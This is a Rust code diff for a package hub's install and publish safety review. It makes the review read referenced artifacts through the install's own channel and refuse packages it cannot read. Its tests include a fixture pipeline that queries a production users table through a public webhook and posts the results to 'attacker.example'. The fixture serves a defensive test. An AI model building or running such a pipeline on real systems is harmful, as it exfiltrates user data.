@@ -32,6 +32,7 @@ use crate::platform::model::{
 use crate::platform::policy::package::{
     PackagePolicyEntry, PackageReviewOptions, PackageSafetyReview, review_package_entries,
 };
+use crate::platform::policy::report::PolicyRiskLevel;
 use crate::platform::sekejap;
 use crate::platform::services::project::derive_trigger_kind_from_source;
 use crate::platform::services::tsx_outline::extract_import_sources;
@@ -164,6 +165,17 @@ struct PreparedHubInstallEntry {
 /// Directory every channel keeps its content-addressed artifacts in.
 const HUB_ARTIFACT_DIR: &str = "artifacts";
 
+/// Why a package supplied as a document body has nowhere to fetch from.
+///
+/// The review and the install it precedes name the same reason, so a refusal
+/// reads the same whichever of the two the user reached first.
+const LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL: &str = "a bundle supplied as a document body says nothing about where its artifacts live; \
+     install it from its file instead";
+
+/// Why a channel that only moved the document cannot fetch referenced bytes.
+const CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION: &str =
+    "this channel does not say where its artifacts live";
+
 /// Where the channel a package arrived through keeps its referenced artifacts.
 ///
 /// An artifact reference carries a digest and never a location, so the location
@@ -270,6 +282,17 @@ impl HubArtifactChannel {
     }
 }
 
+/// Where a document read from disk keeps its artifacts.
+///
+/// The review and the install must read the same directory, or a package could
+/// review against bytes the install never fetches.
+fn local_document_channel_base(document_path: &Path) -> PathBuf {
+    document_path
+        .parent()
+        .unwrap_or(Path::new("."))
+        .to_path_buf()
+}
+
 /// `<base>/artifacts/<sha256>`.
 ///
 /// The digest is the whole file name, so it is checked before it becomes a path
@@ -345,6 +368,9 @@ pub struct HubPublishReview {
     pub seed_data: Vec<String>,
     pub project_initialization: serde_json::Value,
     pub warnings: Vec<String>,
+    /// Findings no approval overrides, in the same tier the install review uses.
+    #[serde(default)]
+    pub violations: Vec<String>,
     pub risk_level: String,
 }
 
@@ -1770,6 +1796,10 @@ impl HubService {
             tags,
             media,
             project_initialization,
+            // An export carries every entry inline today, so this channel is the
+            // answer for a referenced one: only an artifact already in this
+            // instance's store could be published and resolved by a receiver.
+            &self.artifact_store(),
         )
     }
 
@@ -1993,6 +2023,7 @@ impl HubService {
             version,
             target_folder,
             &payload,
+            &self.artifact_store(),
         )
     }
 
@@ -2020,6 +2051,7 @@ impl HubService {
             version,
             target_folder,
             &payload,
+            &HubArtifactChannel::unresolvable(LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL),
         )
     }
 
@@ -2044,10 +2076,7 @@ impl HubService {
             version,
             target_folder,
             payload,
-            &HubArtifactChannel::unresolvable(
-                "a bundle supplied as a document body says nothing about where its \
-                 artifacts live; install it from its file instead",
-            ),
+            &HubArtifactChannel::unresolvable(LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL),
         )
     }
 
@@ -2072,6 +2101,7 @@ impl HubService {
             version,
             target_folder,
             &payload,
+            &HubArtifactChannel::local(local_document_channel_base(document_path)),
         )
     }
 
@@ -2087,10 +2117,6 @@ impl HubService {
         document_path: &Path,
     ) -> Result<HubInstallResult, PlatformError> {
         let payload = read_local_node_bundle_document(document_path, "NODE_BUNDLE_INSTALL")?;
-        let base = document_path
-            .parent()
-            .unwrap_or(Path::new("."))
-            .to_path_buf();
         self.install_node_bundle_payload(
             slug_segment(target_owner),
             slug_segment(target_project),
@@ -2098,7 +2124,7 @@ impl HubService {
             version,
             target_folder,
             payload,
-            &HubArtifactChannel::local(base),
+            &HubArtifactChannel::local(local_document_channel_base(document_path)),
         )
     }
 
@@ -2124,6 +2150,7 @@ impl HubService {
             version,
             target_folder,
             &payload,
+            artifacts,
         )?;
         if !review.violations.is_empty() {
             return Err(PlatformError::new(
@@ -2170,7 +2197,7 @@ impl HubService {
             target_folder,
             source_id,
             payload,
-            &HubArtifactChannel::unresolvable("this channel does not say where its artifacts live"),
+            &HubArtifactChannel::unresolvable(CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION),
         )
     }
 
@@ -2385,6 +2412,11 @@ impl HubService {
         Ok(())
     }
 
+    /// Reviews a package against the channel it would be installed through.
+    ///
+    /// The channel is not optional detail: a referenced entry's bytes live
+    /// there, and a review that cannot fetch them would otherwise scan an empty
+    /// string and clear a file the install still writes.
     fn review_artifact_payload(
         &self,
         target_owner: &str,
@@ -2393,10 +2425,18 @@ impl HubService {
         version: &str,
         target_folder: &str,
         payload: &HubPackageSpec,
+        artifacts: &HubArtifactChannel,
     ) -> Result<HubInstallReview, PlatformError> {
         let layout = self.projects.project_layout(target_owner, target_project)?;
         let install_root =
             install_root_for_target_folder(package_id, &payload.asset_kind, target_folder);
+        // The same choice the install makes, so what the review calls an
+        // overwrite is what the install would actually overwrite.
+        let install_base = if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
+            &layout.data_dir
+        } else {
+            &layout.repo_dir
+        };
         let mut files_added = Vec::new();
         let mut files_overwritten = Vec::new();
         let mut pipelines_registered = Vec::new();
@@ -2404,7 +2444,7 @@ impl HubService {
 
         for entry in &payload.files {
             let install_rel = install_rel_path_under_folder(&install_root, &entry.rel_path);
-            let dest_abs = layout.repo_dir.join(&install_rel);
+            let dest_abs = install_base.join(&install_rel);
             if dest_abs.exists() {
                 files_overwritten.push(install_rel.clone());
             } else {
@@ -2413,7 +2453,10 @@ impl HubService {
             if install_rel.ends_with(".zf.json") && install_rel.starts_with("pipelines/") {
                 pipelines_registered.push(install_rel.clone());
             }
-            policy_entries.push(package_policy_entry(&install_rel, entry));
+            // Keyed on the destination, never the manifest path: the install
+            // decides where an entry lands, so the review scans the same path
+            // the install would register.
+            policy_entries.push(package_policy_entry(&install_rel, entry, artifacts));
         }
         let mut policy =
             review_package_entries(&policy_entries, Vec::new(), PackageReviewOptions::default());
@@ -2921,6 +2964,7 @@ impl HubService {
             version,
             target_folder,
             &artifact,
+            &HubArtifactChannel::unresolvable(CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION),
         )
     }
 
@@ -3824,6 +3868,7 @@ fn validate_hub_gallery(
     Ok(())
 }
 
+#[allow(clippy::too_many_arguments)]
 fn review_publish_artifact(
     package_id: String,
     version: String,
@@ -3834,11 +3879,12 @@ fn review_publish_artifact(
     tags: Vec<String>,
     media: Vec<HubPublishMediaReview>,
     project_initialization: HubPackageInitialization,
+    artifacts: &HubArtifactChannel,
 ) -> Result<HubPublishReview, PlatformError> {
     let policy_entries = preview
         .entries
         .iter()
-        .map(|entry| package_policy_entry(&entry.rel_path, entry))
+        .map(|entry| package_policy_entry(&entry.rel_path, entry, artifacts))
         .collect::<Vec<_>>();
     let policy = review_package_entries(
         &policy_entries,
@@ -3880,6 +3926,7 @@ fn review_publish_artifact(
         project_initialization: serde_json::to_value(project_initialization)
             .map_err(|err| PlatformError::new("HUB_PUBLISH_REVIEW", err.to_string()))?,
         warnings: policy.warnings,
+        violations: policy.violations,
         risk_level: policy.risk_level,
     })
 }
@@ -4767,16 +4814,59 @@ fn entry_text(entry: &HubPackageFile) -> Option<String> {
     Some(content.to_string())
 }
 
-fn package_policy_entry(rel_path: &str, entry: &HubPackageFile) -> PackagePolicyEntry {
+/// The text one manifest entry contributes to the safety review.
+///
+/// A referenced entry is fetched and verified through the channel here, so the
+/// review reads exactly the bytes the install would write instead of nothing.
+/// `Err` is the answer that matters: bytes exist that the review cannot see,
+/// which is never the same fact as an empty file.
+fn entry_review_text(
+    entry: &HubPackageFile,
+    artifacts: &HubArtifactChannel,
+) -> Result<String, String> {
+    let bytes = match entry.supply() {
+        Some(HubPackageFileSupply::Carried(content)) if entry.encoding == "base64" => {
+            base64::engine::general_purpose::STANDARD
+                .decode(content)
+                .map_err(|error| format!("base64 content does not decode: {error}"))?
+        }
+        Some(HubPackageFileSupply::Carried(content)) => return Ok(content.to_string()),
+        Some(HubPackageFileSupply::Referenced(artifact)) => artifacts
+            .resolve(&entry.rel_path, artifact, entry.size_bytes)
+            .map_err(|error| error.to_string())?,
+        None => {
+            return Err(
+                "the entry declares neither carried content nor a referenced artifact".to_string(),
+            );
+        }
+    };
+    String::from_utf8(bytes).map_err(|_| "the bytes are not UTF-8 text".to_string())
+}
+
+fn package_policy_entry(
+    rel_path: &str,
+    entry: &HubPackageFile,
+    artifacts: &HubArtifactChannel,
+) -> PackagePolicyEntry {
+    let (content, unreadable) = match entry_review_text(entry, artifacts) {
+        Ok(text) => (text, String::new()),
+        Err(reason) => (String::new(), reason),
+    };
     PackagePolicyEntry {
         rel_path: rel_path.to_string(),
         kind: entry.kind.clone(),
         size_bytes: entry.size_bytes,
-        content: entry_text(entry).unwrap_or_default(),
+        content,
+        unreadable,
     }
 }
 
 fn install_risk_level(policy: &PackageSafetyReview, has_overwrites: bool) -> String {
+    // Overwrites re-score an installable package. They cannot re-score one that
+    // is refused outright, so a violation short-circuits before any of it.
+    if !policy.violations.is_empty() {
+        return PolicyRiskLevel::Blocked.as_str().to_string();
+    }
     let mut risk_score = 0;
     if has_overwrites {
         risk_score += 2;
@@ -5661,6 +5751,182 @@ mod tests {
                 "'{rel}' must not depend on how its bytes travelled"
             );
         }
+    }
+
+    // ── The review reads what the install writes ────────────────────────
+    //
+    // A referenced entry's bytes live on the channel, so a review that does not
+    // fetch them scans an empty string. These prove that how a pipeline
+    // travelled never changes the verdict it gets.
+
+    /// A pipeline worth refusing: a public webhook that reads a credentialed
+    /// database and posts the result to somebody else's host.
+    const DANGEROUS_PIPELINE: &str = r#"{
+        "apiVersion": "zebflow.com/v1",
+        "kind": "Pipeline",
+        "metadata": { "name": "exfiltrate" },
+        "spec": {
+            "nodes": [
+                { "id": "t1", "kind": "n.trigger.webhook",
+                  "config": { "path": "/public/exfiltrate", "method": "POST" } },
+                { "id": "n1", "kind": "n.db.query",
+                  "config": { "credential": "prod-postgres", "query": "select * from users" } },
+                { "id": "n2", "kind": "n.http.request",
+                  "config": { "url": "https://attacker.example/collect" } }
+            ]
+        }
+    }"#;
+
+    /// One pipeline package whose single entry is supplied by the caller, so
+    /// the carried and referenced forms differ in nothing else.
+    fn pipeline_package(asset_kind: &str, entry: serde_json::Value) -> HubPackageSpec {
+        serde_json::from_value(serde_json::json!({
+            "asset_kind": asset_kind,
+            "title": "Exfiltrator",
+            "description": "A package whose pipeline may travel beside the document.",
+            "files": [entry]
+        }))
+        .expect("package spec")
+    }
+
+    fn carried_pipeline_entry() -> serde_json::Value {
+        serde_json::json!({
+            "rel_path": "pipelines/exfiltrate.zf.json", "kind": "pipeline",
+            "size_bytes": DANGEROUS_PIPELINE.len(), "reason": "test",
+            "content": DANGEROUS_PIPELINE
+        })
+    }
+
+    fn referenced_pipeline_entry(sha256: &str) -> serde_json::Value {
+        serde_json::json!({
+            "rel_path": "pipelines/exfiltrate.zf.json", "kind": "pipeline",
+            "size_bytes": DANGEROUS_PIPELINE.len(), "reason": "test",
+            "artifact": { "sha256": sha256, "media_type": "application/json" }
+        })
+    }
+
+    /// The same pipeline, carried and referenced, reviewed through a channel
+    /// that holds it: one verdict, because a transport decision is not a safety
+    /// decision.
+    #[test]
+    fn a_referenced_pipeline_reviews_exactly_as_the_carried_one_does() {
+        let root = tempfile::tempdir().unwrap();
+        let platform = test_platform(&root);
+        let sha256 = platform
+            .hub
+            .store_artifact(DANGEROUS_PIPELINE.as_bytes())
+            .expect("the store takes the pipeline");
+
+        let review_of = |entry: serde_json::Value| {
+            platform
+                .hub
+                .review_artifact_payload(
+                    "superadmin",
+                    "default",
+                    "exfilpkg",
+                    "1.0.0",
+                    "",
+                    &pipeline_package(HUB_ASSET_KIND_PIPELINE_BUNDLE, entry),
+                    &platform.hub.artifact_store(),
+                )
+                .expect("the review runs")
+        };
+
+        let carried = review_of(carried_pipeline_entry());
+        let referenced = review_of(referenced_pipeline_entry(&sha256));
+
+        assert!(
+            carried
+                .public_endpoints
+                .contains(&"/public/exfiltrate".to_string()),
+            "the carried form is the control and must see the endpoint"
+        );
+        assert_eq!(
+            serde_json::to_value(&referenced).unwrap(),
+            serde_json::to_value(&carried).unwrap(),
+            "how the bytes travelled must not change a single reviewed fact"
+        );
+    }
+
+    /// A channel with nowhere to look does not clear the package: the review
+    /// says it cannot read the pipeline, which is a refusal and not a pass.
+    #[test]
+    fn a_pipeline_the_channel_cannot_resolve_blocks_the_review() {
+        let root = tempfile::tempdir().unwrap();
+        let platform = test_platform(&root);
+        let sha256 = sha256_hex(DANGEROUS_PIPELINE.as_bytes());
+
+        let review = platform
+            .hub
+            .review_artifact_payload(
+                "superadmin",
+                "default",
+                "exfilpkg",
+                "1.0.0",
+                "",
+                &pipeline_package(
+                    HUB_ASSET_KIND_PIPELINE_BUNDLE,
+                    referenced_pipeline_entry(&sha256),
+                ),
+                &HubArtifactChannel::unresolvable(CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION),
+            )
+            .expect("the review runs");
+
+        assert!(
+            !review.installable && review.risk_level == "blocked",
+            "an unreadable pipeline must block, not pass: {review:?}"
+        );
+        assert!(
+            review
+                .violations
+                .iter()
+                .any(|item| item.starts_with("pipelines/hub/exfilpkg/exfiltrate.zf.json:")),
+            "the violation names the destination the install would write: {:?}",
+            review.violations
+        );
+        assert!(
+            review.nodes_used.is_empty() && review.public_endpoints.is_empty(),
+            "nothing may be reported as reviewed when nothing could be read"
+        );
+    }
+
+    /// The refusal lands before the install writes, so a package it cannot
+    /// review leaves the project exactly as it found it.
+    #[test]
+    fn an_unreadable_pipeline_refuses_the_install_before_anything_is_written() {
+        let root = tempfile::tempdir().unwrap();
+        let platform = test_platform(&root);
+        let sha256 = sha256_hex(DANGEROUS_PIPELINE.as_bytes());
+        let document = serde_json::json!({
+            "apiVersion": "zebflow.com/v1",
+            "kind": "HubPackage",
+            "metadata": { "name": "exfilpkg", "version": "1.0.0" },
+            "spec": serde_json::to_value(pipeline_package(
+                HUB_ASSET_KIND_NODE_BUNDLE,
+                referenced_pipeline_entry(&sha256),
+            ))
+            .unwrap()
+        });
+
+        let error = platform
+            .hub
+            .install_local_node_bundle(
+                "superadmin",
+                "default",
+                "exfilpkg",
+                "1.0.0",
+                "pipelines/hub/exfilpkg",
+                document,
+            )
+            .expect_err("a package the review cannot read must not install");
+        assert_eq!(error.code, "NODE_BUNDLE_INSTALL_REFUSED");
+        assert!(
+            !root
+                .path()
+                .join("users/superadmin/default/data/pipelines/hub/exfilpkg")
+                .exists(),
+            "the refusal must precede every write"
+        );
     }
 
     /// Installs the carried bundle, then returns everything a refused second
